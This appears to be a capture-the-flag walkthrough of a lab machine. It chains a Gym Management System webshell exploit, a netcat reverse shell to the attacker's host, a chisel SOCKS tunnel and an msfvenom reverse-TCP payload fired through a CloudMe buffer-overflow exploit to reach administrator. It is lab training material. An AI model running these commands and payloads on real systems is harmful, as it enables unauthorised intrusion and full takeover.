We find the Readme file which tellls us that we can access to the table.sql file (http://10.10.10.198:8080/cgi-bin/printenv.pl) and we are running an app called "gym management system" which we can find by searchsploit. We will use **[this exploit](https://www.exploit-db.com/exploits/48506)**

```bash
┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Buff-10.10.10.198]
└─$ python 48506 http://10.10.10.198:8080/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
buff\shaun
```

First lets move nc.exe binary and get a proper shell

```bash
┌──(kali㉿kali)-[~/Documents/Resources]
└─$ sudo impacket-smbserver share -smb2support .                       
[sudo] password for kali: 
Impacket v0.11.0 - Copyright 2023 Fortra

------------

C:\xampp\htdocs\gym\upload> copy \\10.10.14.11\share\nc.exe .
C:\xampp\htdocs\gym\upload> .\nc.exe -e cmd.exe 10.10.14.11 9001

------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 9001                             
listening on [any] 9001 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.198] 49920
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>
```

Now we found a binary file `C:\Users\shaun\Downloads\CloudMe_1112.exe`  which we found executing locally on port 8888

```bash
C:\Users\shaun\Downloads>netstat -an | findstr "LISTENING"
netstat -an | findstr "LISTENING"
  [...SNIP...]
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING
  [...SNIP...]

C:\Users\shaun\Downloads>tasklist /svc

Image Name PID Services

========================= ======== ============================================
[...SNIP...]
CloudMe.exe 1448 N/A
[...SNIP...]
```

We found **[this exploit](https://www.exploit-db.com/exploits/48389)** for the service CloudMe and we need to execute it through python, which we don't have in the victim machine. Lets connect our attack machine to the service through chisel, we will use a reverse dynamic Socks proxy

```bash
┌──(kali㉿kali)-[~/Documents/Resources/chisel]
└─$ ./chisel server -p 9999 --reverse
2023/11/07 22:06:30 server: Reverse tunnelling enabled
2023/11/07 22:06:30 server: Fingerprint qUprB6Aw2OE7Lrw5jdWSgimfVX8lN+7hkYrAoFtZ9bU=
2023/11/07 22:06:30 server: Listening on http://0.0.0.0:9999
2023/11/07 22:06:54 server: session#1: tun: proxy#R:127.0.0.1:9000=>socks: Listening

----------

C:\Windows\Temp>.\chisel.exe client 10.10.14.11:9999 R:9000:socks
.\chisel.exe client 10.10.14.11:9999 R:9000:socks                                                                   
2023/11/07 21:06:54 client: Connecting to ws://10.10.14.11:9999
2023/11/07 21:06:54 client: Connected (Latency 51.4847ms)
```

Now we can redirect the request to the port 9000 in our attack machine through proxychains4. For that we need to add the following line to /etc/proxychains4.conf

```text
socks5    127.0.0.1    9000
```

Its time to configure the exploit. In the exploit we can see a POC launching the calc in windows. We can generate another payload with msfvenom. In this case, we configure a stage payload (windows/shell/reverse_tcp) so we need to catch the shell with msfconsole

![[Pasted image 20231107225919.png]]

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Buff-10.10.10.198]
└─$ msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.11 LPORT=9001 -b '\x00\x0A\x0D' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of python file: 1887 bytes
buf =  b""
buf += b"\xdb\xc9\xd9\x74\x24\xf4\x5b\xb8\x7c\x44\xb3\x3a"
buf += b"\x29\xc9\xb1\x59\x31\x43\x19\x03\x43\x19\x83\xc3"
[...SNIP...]

------------

┌──(kali㉿kali)-[~/Documents/Boxes/Buff-10.10.10.198]
└─$ proxychains4 python3 48389
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  127.0.0.1:8888  ...  OK

------------

Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique 
   LHOST     10.10.14.11      yes       The listen address 
   LPORT     9001             yes       The listen port

msf6 exploit(multi/handler) > run

C:\Windows\system32>whoami
whoami
buff\administrator
```

And we are root

